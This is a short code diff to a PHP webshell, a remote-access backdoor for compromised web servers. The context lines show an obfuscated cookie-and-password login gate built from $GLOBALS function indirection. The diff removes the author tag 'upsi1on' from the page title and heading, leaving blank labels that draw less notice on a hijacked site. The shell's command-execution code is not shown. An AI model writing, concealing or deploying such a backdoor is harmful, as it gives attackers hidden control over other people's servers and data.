@@ -64,7 +64,7 @@ if (@$GLOBALS[46] ($GLOBALS[47] ($_COOKIE["webshelLoginVerify"]), $password)) {
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>upsi1on</title>
+    <title></title>
     <style>
         body, input, button, a {
             color: white;
@@ -208,7 +208,7 @@ if (@!$GLOBALS[46] ($GLOBALS[47] ($_COOKIE["webshelLoginVerify"]), $password)) {
 ?>
 
     <center>
-        <h2>webshell by upsi1on</h2>
+        <h2></h2>
         <form method="post">
             <input type="password" name="password" placeholder="password">
             <button type="submit">&nbsp;submit&nbsp;</button>
